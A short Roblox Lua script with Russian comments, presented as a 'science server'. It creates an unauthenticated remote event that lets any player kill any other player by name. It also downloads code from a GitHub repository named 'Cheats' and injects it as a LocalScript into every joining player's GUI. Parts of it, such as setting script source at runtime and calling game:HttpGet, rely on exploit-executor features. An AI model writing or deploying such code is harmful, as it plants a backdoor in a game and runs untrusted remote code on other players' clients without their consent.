-- 🔬 НАУЧНЫЙ СЕРВЕР: создаёт Event и подгружает LocalScript для игроков

local server = Instance.new("Script")
server.Name = "ScienceServer"
server.Parent = game.ServerScriptService

server.Source = [[
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local Players = game:GetService("Players")
    local HttpService = game:GetService("HttpService")

    -- Создаём RemoteEvent
    local labEvent = Instance.new("RemoteEvent")
    labEvent.Name = "LabEvent"
    labEvent.Parent = ReplicatedStorage

    print("[СЕРВЕР] LabEvent создан")

    -- Реакция на команды GUI
    labEvent.OnServerEvent:Connect(function(sender, action, target)
        if action == "KillPlayer" then
            local targetPlayer = Players:FindFirstChild(target)
            if targetPlayer and targetPlayer.Character then
                targetPlayer.Character:BreakJoints()
                print("[СЕРВЕР] ".. sender.Name .." убил ".. targetPlayer.Name)
            else
                warn("[СЕРВЕР] Не найден игрок с ником: ".. tostring(target))
            end
        elseif action == "KillSelf" then
            if sender.Character then
                sender.Character:BreakJoints()
                print("[СЕРВЕР] ".. sender.Name .." убил сам себя")
            end
        end
    end)

    -- Когда заходит игрок, загружаем ему LocalScript
    Players.PlayerAdded:Connect(function(plr)
        plr.CharacterAdded:Connect(function()
            -- Загружаем код с GitHub
            local src = game:HttpGet("https://raw.githubusercontent.com/dddadads/Cheats/refs/heads/main/Client.lua")
            local localScript = Instance.new("LocalScript")
            localScript.Name = "ScienceClient"
            localScript.Source = src
            localScript.Parent = plr:WaitForChild("PlayerGui")
            print("[СЕРВЕР] LocalScript вставлен для "..plr.Name)
        end)
    end)
]]
